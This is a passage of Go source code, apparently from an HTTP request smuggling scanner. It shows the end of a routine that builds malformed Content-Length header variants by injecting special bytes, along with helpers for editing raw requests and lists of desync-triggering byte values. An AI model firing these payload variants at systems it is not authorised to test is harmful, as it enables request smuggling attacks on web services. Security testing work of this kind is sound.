			return bytes.Join([][]byte{[]byte("Content-Length"), bc, []byte(": " + clValue)}, nil)
		case "CL-prespace" + sfx:
			// <byte>Content-Length: <value> — byte prepended to the header name
			return bytes.Join([][]byte{bc, clFull}, nil)
		case "CL-endspace" + sfx:
			// Content-Length: <value><byte> — byte appended directly after the value
			return bytes.Join([][]byte{clFull, bc}, nil)
		case "CL-xprespace" + sfx:
			// X: X<byte>Content-Length: <value>
			// Previous header's value bleeds into CL via the special byte (no CRLF between them).
			// Front-ends may see one folded header; back-ends may split and recognise CL.
			return bytes.Join([][]byte{[]byte("X: X"), bc, clFull}, nil)
		case "CL-endspacex" + sfx:
			// Content-Length: <value><byte>X: X
			// CL value bleeds into a dummy token; some parsers ignore the trailing junk.
			return bytes.Join([][]byte{clFull, bc, []byte("X: X")}, nil)
		case "CL-rxprespace" + sfx:
			// X: X\r<byte>Content-Length: <value> — CR + byte between the two headers
			return bytes.Join([][]byte{[]byte("X: X\r"), bc, clFull}, nil)
		case "CL-xnprespace" + sfx:
			// X: X<byte>\nContent-Length: <value> — byte + LF between the two headers
			return bytes.Join([][]byte{[]byte("X: X"), bc, []byte("\n"), clFull}, nil)
		case "CL-endspacerx" + sfx:
			// Content-Length: <value>\r<byte>X: X — CR + byte after CL value
			return bytes.Join([][]byte{clFull, []byte("\r"), bc, []byte("X: X")}, nil)
		case "CL-endspacexn" + sfx:
			// Content-Length: <value><byte>\nX: X — byte + LF after CL value
			return bytes.Join([][]byte{clFull, bc, []byte("\n"), []byte("X: X")}, nil)
		}
	}

	return req
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

// appendHeader inserts a new header line before \r\n\r\n WITHOUT checking for
// an existing header of the same name. Used when two headers with the same name
// must coexist (e.g. dualchunk: Transfer-Encoding: chunked + Transfer-encoding: identity).
func appendHeader(req []byte, name, value string) []byte {
	sep := []byte("\r\n\r\n")
	idx := bytes.Index(req, sep)
	if idx < 0 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:idx])
	buf.WriteString("\r\n" + name + ": " + value)
	buf.Write(req[idx:])
	return buf.Bytes()
}

func replaceBytes(src, old, newB []byte) []byte {
	return bytes.Replace(src, old, newB, 1)
}

func replaceFirstBytes(src, old, newB []byte) []byte {
	idx := bytes.Index(src, old)
	if idx < 0 {
		return src
	}
	var buf bytes.Buffer
	buf.Write(src[:idx])
	buf.Write(newB)
	buf.Write(src[idx+len(old):])
	return buf.Bytes()
}

// addOrReplaceHeader adds or replaces a header in the raw HTTP request bytes.
func addOrReplaceHeader(req []byte, name, value string) []byte {
	headerLine := []byte(name + ": ")
	if idx := bytes.Index(bytes.ToLower(req), bytes.ToLower(headerLine)); idx >= 0 {
		// find end of that header line
		end := bytes.Index(req[idx:], []byte("\r\n"))
		if end < 0 {
			return req
		}
		var buf bytes.Buffer
		buf.Write(req[:idx])
		buf.WriteString(name + ": " + value)
		buf.Write(req[idx+end:])
		return buf.Bytes()
	}
	// insert before blank line separating headers from body
	sep := []byte("\r\n\r\n")
	idx := bytes.Index(req, sep)
	if idx < 0 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:idx])
	buf.WriteString("\r\n" + name + ": " + value)
	buf.Write(req[idx:])
	return buf.Bytes()
}

// SetMethod replaces the HTTP method in the request line.
func SetMethod(req []byte, method string) []byte {
	sp := bytes.IndexByte(req, ' ')
	if sp < 0 {
		return req
	}
	var buf bytes.Buffer
	buf.WriteString(method)
	buf.Write(req[sp:])
	return buf.Bytes()
}

// SetHeader sets a header value (adds if absent).
func SetHeader(req []byte, name, value string) []byte {
	return addOrReplaceHeader(req, name, value)
}

// GetHeader returns the value of a named header, or "".
func GetHeader(req []byte, name string) string {
	search := []byte(strings.ToLower(name) + ": ")
	lower := bytes.ToLower(req)
	idx := bytes.Index(lower, search)
	if idx < 0 {
		return ""
	}
	start := idx + len(search)
	end := bytes.Index(req[start:], []byte("\r\n"))
	if end < 0 {
		return string(req[start:])
	}
	return string(req[start : start+end])
}

func extractHost(req []byte) string {
	return GetHeader(req, "Host")
}

func extractPath(req []byte) string {
	parts := bytes.SplitN(req, []byte(" "), 3)
	if len(parts) < 2 {
		return "/"
	}
	return string(parts[1])
}

// CLZeroBytes returns the set of byte values used in CLZero's dynamic Content-Length
// permutation families. Each byte is injected into a specific structural position of
// the Content-Length header line to probe parser inconsistencies.
// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
func CLZeroBytes() []int {
	return []int{0x01, 0x04, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x1f, 0x20, 0x7f, 0xa0, 0xff}
}

// SpecialChars returns the set of byte values used for dynamic TE permutations.
// Expanded to match the full set used by github.com/amirnsahmad/smuggler and
// github.com/Moopinger/CLZero — 14 bytes that trigger parsing discrepancies
// in various proxies and back-end servers.
//
// Includes 0x00 (NUL) which Burp's HTTP/2 probe uses for H2-specific
// transfer-encoding name/value mutations via HPACK.
//
// Original Java DesyncBox set (6 bytes) is a strict subset of this list.
func SpecialChars() []int {
	return append([]int{0x00}, CLZeroBytes()...)
}

// specialChars is an unexported alias kept for internal H1 TE permutations.
// H1 NUL-byte variants are excluded (most servers reject NUL in headers at the
// TCP/TLS layer), so it omits 0x00 and uses only CLZeroBytes.
func specialChars() []int {
	return CLZeroBytes()
}
